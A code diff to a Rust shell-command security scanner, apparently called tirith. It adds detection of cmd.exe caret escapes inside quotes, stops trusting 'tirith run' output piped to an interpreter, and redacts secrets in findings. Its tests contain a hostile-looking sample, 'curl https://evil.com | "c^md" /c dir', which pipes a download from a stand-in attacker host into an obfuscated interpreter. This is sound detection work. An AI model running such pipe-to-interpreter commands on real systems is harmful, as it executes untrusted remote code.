@@ -1,4 +1,5 @@
 use crate::extract::ScanContext;
+use crate::redact;
 use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
@@ -140,6 +141,10 @@ fn normalize_shell_token(input: &str, shell: ShellType) -> String {
                 if chars[i] == '"' {
                     state = QState::Normal;
                     i += 1;
+                } else if is_cmd && chars[i] == '^' && i + 1 < len {
+                    // Cmd caret escaping is still active inside double quotes.
+                    out.push(chars[i + 1]);
+                    i += 2;
                 } else if !is_ps && chars[i] == '\\' && i + 1 < len {
                     // POSIX: only \", \\, \$, \` are special inside double quotes
                     let next = chars[i + 1];
@@ -745,9 +750,20 @@ fn check_pipe_to_interpreter(
                     let source = &segments[i - 1];
                     let source_cmd_ref = source.command.as_deref().unwrap_or("unknown");
                     let source_base = normalize_cmd_base(source_cmd_ref, shell);
+                    let source_is_tirith_run = source_base == "tirith"
+                        && source
+                            .args
+                            .first()
+                            .map(|arg| normalize_cmd_base(arg, shell) == "run")
+                            .unwrap_or(false);
+                    let source_label = if source_is_tirith_run {
+                        "tirith run".to_string()
+                    } else {
+                        source_base.clone()
+                    };
 
                     // Skip if the source is tirith itself — its output is trusted.
-                    if source_base == "tirith" {
+                    if source_base == "tirith" && !source_is_tirith_run {
                         continue;
                     }
 
@@ -762,7 +778,7 @@ fn check_pipe_to_interpreter(
                     let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);
 
                     let base_desc = format!(
-                        "Command pipes output from '{source_base}' directly to \
+                        "Command pipes output from '{source_label}' directly to \
                          interpreter '{interpreter}'. Downloaded content will be \
                          executed without inspection."
                     );
@@ -808,7 +824,10 @@ fn check_pipe_to_interpreter(
                         description,
                         evidence: vec![Evidence::CommandPattern {
                             pattern: "pipe to interpreter".to_string(),
-                            matched: format!("{} | {}", source.raw, seg.raw),
+                            matched: redact::redact_shell_assignments(&format!(
+                                "{} | {}",
+                                source.raw, seg.raw
+                            )),
                         }],
                         human_view: None,
                         agent_view: None,
@@ -838,7 +857,7 @@ fn check_dotfile_overwrite(segments: &[tokenize::Segment], findings: &mut Vec<Fi
                 description: "Command redirects output to a dotfile in the home directory, which could overwrite shell configuration".to_string(),
                 evidence: vec![Evidence::CommandPattern {
                     pattern: "redirect to dotfile".to_string(),
-                    matched: raw.clone(),
+                    matched: redact::redact_shell_assignments(raw),
                 }],
                 human_view: None,
                 agent_view: None,
@@ -877,7 +896,7 @@ fn check_archive_extract(segments: &[tokenize::Segment], findings: &mut Vec<Find
                             ),
                             evidence: vec![Evidence::CommandPattern {
                                 pattern: "archive extract".to_string(),
-                                matched: raw.clone(),
+                                matched: redact::redact_shell_assignments(raw),
                             }],
                             human_view: None,
                             agent_view: None,
@@ -1120,11 +1139,10 @@ fn emit_env_finding(var_name: &str, value: &str, findings: &mut Vec<Finding>) {
 }
 
 fn redact_env_value(val: &str) -> String {
-    let prefix = crate::util::truncate_bytes(val, 20);
-    if prefix.len() == val.len() {
-        val.to_string()
+    if val.is_empty() {
+        String::new()
     } else {
-        format!("{prefix}...")
+        "[REDACTED]".to_string()
     }
 }
 
@@ -2139,6 +2157,11 @@ mod tests {
     }
 
     #[test]
+    fn test_normalize_cmd_caret_inside_double_quotes() {
+        assert_eq!(normalize_shell_token("\"c^md\"", ShellType::Cmd), "cmd");
+    }
+
+    #[test]
     fn test_normalize_single_quotes() {
         assert_eq!(normalize_shell_token("'bash'", ShellType::Posix), "bash");
     }
@@ -2557,6 +2580,24 @@ mod tests {
             sanitize_url_for_display("https://evil.com/\x07bell\x00null"),
             "https://evil.com/bellnull"
         );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_cmd_quoted_caret_cmd() {
+        let findings = check_default("curl https://evil.com | \"c^md\" /c dir", ShellType::Cmd);
+        assert!(
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "quoted cmd caret escapes should still detect the interpreter pipe"
+        );
+    }
+
+    #[test]
+    fn test_redact_env_value_never_returns_secret() {
+        assert_eq!(redact_env_value(""), "");
+        assert_eq!(redact_env_value("sk-abc123"), "[REDACTED]");
+        assert_eq!(redact_env_value("ABCDEFGHIJKLMNOPQRSTUVWX"), "[REDACTED]");
     }
 
     #[test]
